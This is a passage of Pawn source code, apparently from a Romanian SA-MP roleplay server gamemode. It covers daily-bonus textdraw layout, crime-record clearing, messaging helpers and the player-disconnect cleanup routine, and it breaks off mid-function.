	PlayerTextDrawColor(playerid, DailyTD[6], 1027424255);
	PlayerTextDrawSetShadow(playerid, DailyTD[6], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[6], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[6], 255);
	PlayerTextDrawFont(playerid, DailyTD[6], 2);
	PlayerTextDrawSetProportional(playerid, DailyTD[6], 1);
	PlayerTextDrawSetShadow(playerid, DailyTD[6], 0);

	DailyTD[7] = CreatePlayerTextDraw(playerid, 138.200286, 238.862518, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[7], 133.000000, 105.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[7], 1);
	PlayerTextDrawColor(playerid, DailyTD[7], 976830719);
	PlayerTextDrawSetShadow(playerid, DailyTD[7], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[7], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[7], 255);
	PlayerTextDrawFont(playerid, DailyTD[7], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[7], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[7], 0);

	DailyTD[8] = CreatePlayerTextDraw(playerid, 150.599884, 243.812500, "PREMIUL_CEL_MARE_ESTE:");
	PlayerTextDrawLetterSize(playerid, DailyTD[8], 0.212499, 1.153751);
	PlayerTextDrawAlignment(playerid, DailyTD[8], 1);
	PlayerTextDrawColor(playerid, DailyTD[8], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[8], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[8], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[8], 255);
	PlayerTextDrawFont(playerid, DailyTD[8], 2);
	PlayerTextDrawSetProportional(playerid, DailyTD[8], 1);
	PlayerTextDrawSetShadow(playerid, DailyTD[8], 0);

	DailyTD[9] = CreatePlayerTextDraw(playerid, 145.799835, 255.925018, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[9], 117.000000, 0.690000);
	PlayerTextDrawAlignment(playerid, DailyTD[9], 1);
	PlayerTextDrawColor(playerid, DailyTD[9], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[9], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[9], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[9], 255);
	PlayerTextDrawFont(playerid, DailyTD[9], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[9], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[9], 0);

	DailyTD[10] = CreatePlayerTextDraw(playerid, 169.599884, 264.812500, "+30_SPIN");
	PlayerTextDrawLetterSize(playerid, DailyTD[10], 0.332000, 1.197501);
	PlayerTextDrawAlignment(playerid, DailyTD[10], 1);
	PlayerTextDrawColor(playerid, DailyTD[10], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[10], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[10], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[10], 255);
	PlayerTextDrawFont(playerid, DailyTD[10], 2);
	PlayerTextDrawSetProportional(playerid, DailyTD[10], 1);
	PlayerTextDrawSetShadow(playerid, DailyTD[10], 0);

	DailyTD[11] = CreatePlayerTextDraw(playerid, 148.700286, 282.175018, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[11], 109.000000, 50.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[11], 1);
	PlayerTextDrawColor(playerid, DailyTD[11], 505290495);
	PlayerTextDrawSetShadow(playerid, DailyTD[11], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[11], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[11], 255);
	PlayerTextDrawFont(playerid, DailyTD[11], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[11], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[11], 0);

	DailyTD[12] = CreatePlayerTextDraw(playerid, 166.000000, 280.125000, "");
	PlayerTextDrawLetterSize(playerid, DailyTD[12], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[12], 72.000000, 55.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[12], 1);
	PlayerTextDrawColor(playerid, DailyTD[12], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[12], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[12], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[12], 0);
	PlayerTextDrawFont(playerid, DailyTD[12], 5);
	PlayerTextDrawSetProportional(playerid, DailyTD[12], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[12], 0);
	PlayerTextDrawSetPreviewModel(playerid, DailyTD[12], 19054);
	PlayerTextDrawSetPreviewRot(playerid, DailyTD[12], 320.000000, 0.000000, 0.000000, 1.000000);

	DailyTD[13] = CreatePlayerTextDraw(playerid, 180.299987, 295.849945, "");
	PlayerTextDrawLetterSize(playerid, DailyTD[13], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[13], 42.000000, 36.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[13], 1);
	PlayerTextDrawColor(playerid, DailyTD[13], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[13], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[13], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[13], 0);
	PlayerTextDrawFont(playerid, DailyTD[13], 5);
	PlayerTextDrawSetProportional(playerid, DailyTD[13], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[13], 0);
	PlayerTextDrawSetPreviewModel(playerid, DailyTD[13], 18631);
	PlayerTextDrawSetPreviewRot(playerid, DailyTD[13], 320.000000, 0.000000, 0.000000, 1.000000);

	DailyTD[14] = CreatePlayerTextDraw(playerid, 281.700286, 138.675018, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[14], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[14], 254.000000, 206.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[14], 1);
	PlayerTextDrawColor(playerid, DailyTD[14], 505290495);
	PlayerTextDrawSetShadow(playerid, DailyTD[14], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[14], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[14], 255);
	PlayerTextDrawFont(playerid, DailyTD[14], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[14], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[14], 0);

	DailyTD[15] = CreatePlayerTextDraw(playerid, 281.700286, 138.675018, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[15], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[15], 6.000000, 205.679626);
	PlayerTextDrawAlignment(playerid, DailyTD[15], 1);
	PlayerTextDrawColor(playerid, DailyTD[15], -424988161);
	PlayerTextDrawSetShadow(playerid, DailyTD[15], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[15], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[15], 255);
	PlayerTextDrawFont(playerid, DailyTD[15], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[15], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[15], 0);

	DailyTD[16] = CreatePlayerTextDraw(playerid, 530.700317, 138.412475, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[16], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[16], 6.000000, 206.029434);
	PlayerTextDrawAlignment(playerid, DailyTD[16], 1);
	PlayerTextDrawColor(playerid, DailyTD[16], -424988161);
	PlayerTextDrawSetShadow(playerid, DailyTD[16], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[16], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[16], 255);
	PlayerTextDrawFont(playerid, DailyTD[16], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[16], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[16], 0);

	DailyTD[17] = CreatePlayerTextDraw(playerid, 513.200317, 232.037475, "LD_BEAT:LEFT");
	PlayerTextDrawLetterSize(playerid, DailyTD[17], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[17], 25.000000, 16.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[17], 1);
	PlayerTextDrawColor(playerid, DailyTD[17], -424988161);
	PlayerTextDrawSetShadow(playerid, DailyTD[17], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[17], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[17], 255);
	PlayerTextDrawFont(playerid, DailyTD[17], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[17], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[17], 0);

	DailyTD[18] = CreatePlayerTextDraw(playerid, 530.700317, 138.412475, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[18], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[18], 6.000000, 206.029434);
	PlayerTextDrawAlignment(playerid, DailyTD[18], 1);
	PlayerTextDrawColor(playerid, DailyTD[18], -424988161);
	PlayerTextDrawSetShadow(playerid, DailyTD[18], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[18], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[18], 255);
	PlayerTextDrawFont(playerid, DailyTD[18], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[18], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[18], 0);

	DailyTD[19] = CreatePlayerTextDraw(playerid, 280.986511, 232.037475, "LD_BEAT:RIGHT");
	PlayerTextDrawLetterSize(playerid, DailyTD[19], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[19], 25.000000, 16.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[19], 1);
	PlayerTextDrawColor(playerid, DailyTD[19], -424988161);
	PlayerTextDrawSetShadow(playerid, DailyTD[19], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[19], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[19], 255);
	PlayerTextDrawFont(playerid, DailyTD[19], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[19], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[19], 0);

	DailyTD[20] = CreatePlayerTextDraw(playerid, 281.700286, 138.675018, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[20], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[20], 6.000000, 205.679626);
	PlayerTextDrawAlignment(playerid, DailyTD[20], 1);
	PlayerTextDrawColor(playerid, DailyTD[20], -424988161);
	PlayerTextDrawSetShadow(playerid, DailyTD[20], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[20], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[20], 255);
	PlayerTextDrawFont(playerid, DailyTD[20], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[20], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[20], 0);

	DailyTD[21] = CreatePlayerTextDraw(playerid, 301.700286, 213.487518, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[21], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[21], 218.000000, -65.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[21], 1);
	PlayerTextDrawColor(playerid, DailyTD[21], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[21], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[21], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[21], 255);
	PlayerTextDrawFont(playerid, DailyTD[21], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[21], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[21], 0);

	DailyTD[22] = CreatePlayerTextDraw(playerid, 303.200317, 211.449920, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[22], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[22], 214.860626, -61.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[22], 1);
	PlayerTextDrawColor(playerid, DailyTD[22], 505290495);
	PlayerTextDrawSetShadow(playerid, DailyTD[22], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[22], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[22], 255);
	PlayerTextDrawFont(playerid, DailyTD[22], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[22], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[22], 0);

	DailyTD[23] = CreatePlayerTextDraw(playerid, 297.700286, 340.050079, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[23], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[23], 218.000000, -65.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[23], 1);
	PlayerTextDrawColor(playerid, DailyTD[23], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[23], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[23], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[23], 255);
	PlayerTextDrawFont(playerid, DailyTD[23], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[23], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[23], 0);

	DailyTD[24] = CreatePlayerTextDraw(playerid, 299.500305, 337.912475, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[24], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[24], 214.860626, -61.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[24], 1);
	PlayerTextDrawColor(playerid, DailyTD[24], 505290495);
	PlayerTextDrawSetShadow(playerid, DailyTD[24], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[24], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[24], 255);
	PlayerTextDrawFont(playerid, DailyTD[24], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[24], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[24], 0);

	DailyTD[25] = CreatePlayerTextDraw(playerid, 306.200286, 220.587524, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[25], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[25], 204.000000, 49.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[25], 1);
	PlayerTextDrawColor(playerid, DailyTD[25], -424988161);
	PlayerTextDrawSetShadow(playerid, DailyTD[25], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[25], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[25], 255);
	PlayerTextDrawFont(playerid, DailyTD[25], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[25], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[25], 0);

	DailyTD[26] = CreatePlayerTextDraw(playerid, 307.000305, 268.787475, "LD_SPAC:WHITE");
	PlayerTextDrawLetterSize(playerid, DailyTD[26], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[26], 203.000000, -47.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[26], 1);
	PlayerTextDrawColor(playerid, DailyTD[26], 505290495);
	PlayerTextDrawSetShadow(playerid, DailyTD[26], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[26], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[26], 255);
	PlayerTextDrawFont(playerid, DailyTD[26], 4);
	PlayerTextDrawSetProportional(playerid, DailyTD[26], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[26], 0);

	DailyTD[27] = CreatePlayerTextDraw(playerid, 274.000000, 144.937500, "");
	PlayerTextDrawLetterSize(playerid, DailyTD[27], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[27], 97.000000, 57.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[27], 1);
	PlayerTextDrawColor(playerid, DailyTD[27], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[27], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[27], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[27], 0);
	PlayerTextDrawFont(playerid, DailyTD[27], 5);
	PlayerTextDrawSetProportional(playerid, DailyTD[27], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[27], 0);
	PlayerTextDrawSetPreviewModel(playerid, DailyTD[27], 1212);
	PlayerTextDrawSetPreviewRot(playerid, DailyTD[27], 90.000000, 0.000000, 90.000000, 1.000000);

	DailyTD[28] = CreatePlayerTextDraw(playerid, 414.599884, 173.375000, "$100,000,000");
	PlayerTextDrawLetterSize(playerid, DailyTD[28], 0.332000, 1.197501);
	PlayerTextDrawAlignment(playerid, DailyTD[28], 2);
	PlayerTextDrawColor(playerid, DailyTD[28], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[28], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[28], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[28], 255);
	PlayerTextDrawFont(playerid, DailyTD[28], 2);
	PlayerTextDrawSetProportional(playerid, DailyTD[28], 1);
	PlayerTextDrawSetShadow(playerid, DailyTD[28], 0);

	DailyTD[29] = CreatePlayerTextDraw(playerid, 427.799957, 237.812561, "300_Premium_Points");
	PlayerTextDrawLetterSize(playerid, DailyTD[29], 0.332000, 1.197501);
	PlayerTextDrawAlignment(playerid, DailyTD[29], 2);
	PlayerTextDrawColor(playerid, DailyTD[29], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[29], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[29], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[29], 255);
	PlayerTextDrawFont(playerid, DailyTD[29], 2);
	PlayerTextDrawSetProportional(playerid, DailyTD[29], 1);
	PlayerTextDrawSetShadow(playerid, DailyTD[29], 0);

	DailyTD[30] = CreatePlayerTextDraw(playerid, 298.000000, 222.375000, "");
	PlayerTextDrawLetterSize(playerid, DailyTD[30], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[30], 64.000000, 43.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[30], 1);
	PlayerTextDrawColor(playerid, DailyTD[30], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[30], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[30], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[30], 0);
	PlayerTextDrawFont(playerid, DailyTD[30], 5);
	PlayerTextDrawSetProportional(playerid, DailyTD[30], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[30], 0);
	PlayerTextDrawSetPreviewModel(playerid, DailyTD[30], 1247);
	PlayerTextDrawSetPreviewRot(playerid, DailyTD[30], 0.000000, 0.000000, 0.000000, 1.000000);

	DailyTD[31] = CreatePlayerTextDraw(playerid, 287.500000, 284.937500, "");
	PlayerTextDrawLetterSize(playerid, DailyTD[31], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, DailyTD[31], 64.000000, 43.000000);
	PlayerTextDrawAlignment(playerid, DailyTD[31], 1);
	PlayerTextDrawColor(playerid, DailyTD[31], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[31], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[31], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[31], 0);
	PlayerTextDrawFont(playerid, DailyTD[31], 5);
	PlayerTextDrawSetProportional(playerid, DailyTD[31], 0);
	PlayerTextDrawSetShadow(playerid, DailyTD[31], 0);
	PlayerTextDrawSetPreviewModel(playerid, DailyTD[31], 1318);
	PlayerTextDrawSetPreviewRot(playerid, DailyTD[31], 180.000000, 0.000000, 90.000000, 1.000000);

	DailyTD[32] = CreatePlayerTextDraw(playerid, 416.799957, 303.000061, "LEVEL_UP");
	PlayerTextDrawLetterSize(playerid, DailyTD[32], 0.332000, 1.197501);
	PlayerTextDrawAlignment(playerid, DailyTD[32], 2);
	PlayerTextDrawColor(playerid, DailyTD[32], -1);
	PlayerTextDrawSetShadow(playerid, DailyTD[32], 0);
	PlayerTextDrawSetOutline(playerid, DailyTD[32], 0);
	PlayerTextDrawBackgroundColor(playerid, DailyTD[32], 255);
	PlayerTextDrawFont(playerid, DailyTD[32], 2);
	PlayerTextDrawSetProportional(playerid, DailyTD[32], 1);
	PlayerTextDrawSetShadow(playerid, DailyTD[32], 0);
}
public ClearCrime(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		new string[50];
		format(string, sizeof(string), "********");
		strmid(PlayerInfo[playerid][pVictim], string, 0, strlen(string), 255);
		strmid(PlayerInfo[playerid][pAccused], string, 0, strlen(string), 255);
		format(string, sizeof(string), "Fara Crima");
		strmid(PlayerInfo[playerid][pCrime1], string, 0, strlen(string), 255);
		strmid(PlayerInfo[playerid][pCrime2], string, 0, strlen(string), 255);
		strmid(PlayerInfo[playerid][pCrime3], string, 0, strlen(string), 255);
		Update(playerid,pCrime1x);
		Update(playerid,pCrime2x);
		Update(playerid,pCrime3x);
		Update(playerid,pAccusedx);
		Update(playerid,pVictimx);
	}
	return 1;
}

public GetWeekDay()
{
	new year,month,day;
    getdate(year, month, day);

	new
		weekday,
		j,
		e;

	if (month <= 2)
	{
		month += 12;
		--year;
	}

	j = year % 100;
	e = year / 100;

	switch ((day + (month+1)*26/10 + j + j/4 + e/4 - 2*e) % 7)
	{
		case 0: weekday = 1;
		case 1: weekday = 2;
		case 2: weekday = 3;
		case 3: weekday = 4;
		case 4: weekday = 5;
		case 5: weekday = 6;
		case 6: weekday = 7;
	}
	return weekday;
}

forward SendLeaderMessage(leader, color, string[]);
public SendLeaderMessage(leader, color, string[])
{
	foreach(Player, i)
	{
		if(gPlayerLogged[i] > 0)
		{
			if(PlayerInfo[i][pLeader] == leader)
			{
				SendClientMessage(i, color, string);
			}
		}	
	}
	return 1;
}

forward SendToClan(groupid, colour, string[]);
public SendToClan(groupid, colour, string[])
{
	foreach(Player, i)
	{
		if(gPlayerLogged[i] > 0)
		{
			if(PlayerInfo[i][pClan] == groupid)
			{
				SendClientMessage(i, colour, string);
			}
		}	
	}
	return 1;
}

public RACtime(playerid)
{
      for(new player=0; player<MAX_PLAYERS; player++)
      {
      if(!IsVehicleOccupied(player)) SetVehicleToRespawn(player);
      }
      for(new car = 1; car <= 1300; car++)
      {
          if(!IsVehicleOccupied(car)) SetVehicleToRespawn(car);

      }
      return 1;
}


// ONPLAYERDISCONNECT
public OnPlayerDisconnect(playerid, reason)
{
	loginautomat[playerid] = 0;
	resetare_detectare_aimbot[playerid] = -1;
	ucideri_detectare_aimbot[playerid] = 0;
	boxawar[playerid] = -1;
	problemalogin[playerid] = -1;
	AscundeTD[playerid] = -1;
	if(T_SAU_CT[playerid] > 0) { paint_jucatori--; }
	T_SAU_CT[playerid] = -1;
	incamerapaintball[playerid] = 0;
	timp_artificie[playerid] = 0;
	tog_admin[playerid] = 1;
	/*QuestTimer[playerid] = -1;
	for(new id = 0; id < sizeof(OMZapada); id++)
	{
		for(new id2 = 0; id2 < 9; id2++)
		{
			if(IsValidDynamicObject(Omdezapada[playerid][id][id2])) { DestroyDynamicObject(Omdezapada[playerid][id][id2]); }
			Omdezapada[playerid][id][id2] = -1;
		}
	}*/
	if(in_afacere_cu[playerid] >= 0)
	{
		Afacere(playerid, in_afacere_cu[playerid], false);
	}
	pregatit_trade[playerid] = 0;
	in_afacere_cu[playerid] = -1;
	invitatie_trade[playerid] = -1;
	kickplayer[playerid] = -1;
	if(!IsPlayerNPC(playerid))
	{
		DestroySnow(playerid);
	}	
	WantedReason[playerid] = 0;
	Radaron[playerid] = 0;
	Radarlimit[playerid] = 0;
	MP3ON[playerid] = 0;
	if(JCurier[playerid][0] > 0) DestroyVehicle(JCurier[playerid][2]);
	if(JCiment[playerid][0] > 0)
	{
		DestroyVehicle(JCiment[playerid][2]);
		RemovePlayerAttachedObject(playerid, betonobject1[playerid]);
		DestroyPlayerObject(playerid,betonobject1[playerid]);	
		DestroyPlayerObject(playerid,betonobject2[playerid]);
	}
	if(JCariera[playerid][0] > 0)
	{
		DestroyVehicle(JCariera[playerid][2]);
		for(new t = 0; t < 26; t++)
		{
			if( IsValidDynamicObject( CarieraObiect[playerid][t] ) )
			{
				DestroyDynamicObject(CarieraObiect[playerid][t]);
			}
		}
	}
	for(new i = 0; i < 4; i++) JCurier[playerid][i] = -1;	
	for(new i = 0; i < 3; i++) JCiment[playerid][i] = -1;	
	for(new i = 0; i < 3; i++) JCariera[playerid][i] = -1;	
	bugobiecte[playerid] = -1;
	timereferral[playerid] = -1;
	vipchat[playerid] = 1;
	arefreeze[playerid] = 0;
	rotiredailybonus[playerid] = -1;
	timercasatorie[playerid] = -1;
	incwar[playerid] = 0;
	mortcwar[playerid] = 0;
	invitatiecattack[playerid] = -1;
	limitabanuri[playerid] = -1;
	banuriinminut[playerid] = 0;
	loginautomat[playerid]  = 0;
	folosirespawnchange[playerid] = 0;
	bonus5ore[playerid] = 0;
	timerkeno[playerid] = -1;
	MizaKeno[playerid] = -1;
	CumparaSkin[playerid] = 0;
	coliziunipns[playerid] = 0;
	TonomatTime[playerid] = -1;
	if(actorbanca[playerid] > 0) DestroyActor(actorbanca[playerid]),actorbanca[playerid] = -1;
	if(banirob[playerid] > 0) RemovePlayerAttachedObject(playerid,0),banirob[playerid] = -1;
	RobTimer[playerid] = -1;
	InTunning[playerid] = 0;
	RefuelTime[playerid] = -1;
	timercuvantcheie[playerid] = -1;
	securitatenr[playerid] = 0;
	Securitate[playerid] = 0;
	if(racingcar[playerid] >= 0)
	{
		DestroyVehicle(racingcar[playerid]);
	}
	racingcar[playerid] = -1;
	DestroyVehicle(DSCAR[playerid]);
	esteinds[playerid] = -1;
	atminterogare[playerid] = -1;
	atmtransfer[playerid] = -1;
	accestransfer[playerid] = -1;
	atmretragere[playerid] = -1;
    adaugarebonus[playerid] = -1;
    esteinATM[playerid] = -1;
    secundepanalaad[playerid] = -1;
    timerreport[playerid] = -1;
    afolositgetpp[playerid] = 0;
    wait5sec[playerid] = -1;
    botmember[playerid] = 0;
    freetimer[playerid] = -1;
    citeste10sec[playerid] = -1;
    TextDrawHideForPlayer(playerid, Logosv1);
	TextDrawHideForPlayer(playerid, Logosv2);
	//for(new i = 0; i < 18; i++) TextDrawHideForPlayer(playerid, LoginTD[i]);
    if(aprimitintrebarea[playerid] >= 0)
	{
 		format(MGLOBAL, sizeof(MGLOBAL), "The question has been deleted because %s left the game now will receive again the question.",GetName(playerid));
   		SCM(aprimitintrebarea[playerid], COLOR_ERROR, MGLOBAL);
	    lastquestion[aprimitintrebarea[playerid]] = -1;
	    timefornextquestion[aprimitintrebarea[playerid]] = 20;
	}
	if(lastquestion[playerid] >= 0)
	{
        PlayerInfo[lastquestion[playerid]][pNMessage2] = 0;
 		PlayerInfo[lastquestion[playerid]][pNMessage] = 0;
   		PlayerInfo[lastquestion[playerid]][pFirstAnswer] = 0;
		SendClientMessage(lastquestion[playerid], COLOR_SERVER, "Now you can again use the /n because you took helper question Disconnected.");
        aprimitintrebarea[lastquestion[playerid]] = -1;
		lastquestion[playerid] = -1;
	}
	Update(playerid,pWantedLevelx);
	timefornextquestion[playerid] = -1;
    HelperDuty[playerid] = 0;
	if(somated[playerid] != -1)
	{
		if(PlayerInfo[playerid][pWantedLevel] > 0 && sarmale[playerid] == 0)
		{
			new string[256];
			foreach(Player, i)
			{
				if(IsPlayerConnected(i))
				{
					new wakaname2[MAX_PLAYER_NAME], price = PlayerInfo[playerid][pWantedLevel] * 1000, totalprice = price / 2, streap[MAX_PLAYER_NAME];
					if(IsACop(i) && CrimInRange(50.0, playerid,i) && OnDuty[i] == 1)
					{
						GetPlayerName(playerid, streap, sizeof(streap));
						GetPlayerName(i, wakaname2, sizeof(wakaname2));
						GameTextForPlayer(i, "Running Suspect bonus!", 5000, 1);
						format(string, sizeof(string), "You got $%d bonus for catching the suspect %s.", totalprice, streap);
						SendClientMessage(i, COLOR_DBLUE, string);
						new var[356], wtime = (300*PlayerInfo[playerid][pWantedLevel]);
						mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `JailTime`='%d',`Jailed`= '1',`WantedLevel`='0' WHERE `name`='%s'",wtime,PlayerInfo[playerid][pNormalName]);
						mysql_tquery(SQL,var,"","");
						format(string, sizeof(string), "********");
						strmid(PlayerInfo[playerid][pVictim], string, 0, strlen(string), 255);
						strmid(PlayerInfo[playerid][pAccused], string, 0, strlen(string), 255);
						format(string, sizeof(string), "Fara Crima");
						PlayerInfo[playerid][pJailTime]=300*PlayerInfo[playerid][pWantedLevel];
						PlayerInfo[playerid][pJailed] = 1;
						PlayerInfo[playerid][pWantedLevel] = 0;
						PlayerInfo[playerid][pWantedDeaths] += 1;
						PlayerInfo[i][pRunners] += 1;
						Update(i,pRunnersx);
						WantedPoints[playerid] = 0;
						ClearCrime(playerid);
						strmid(PlayerInfo[playerid][pCrime1], string, 0, strlen(string), 255);
						strmid(PlayerInfo[playerid][pCrime2], string, 0, strlen(string), 255);
						strmid(PlayerInfo[playerid][pCrime3], string, 0, strlen(string), 255);
						Update(playerid,pCrime1x);
						Update(playerid,pCrime2x);
						Update(playerid,pCrime3x);
						Update(playerid,pAccusedx);
						Update(playerid,pVictimx);
						GivePlayerCash(i, totalprice);
						sarmale[playerid] = 1;
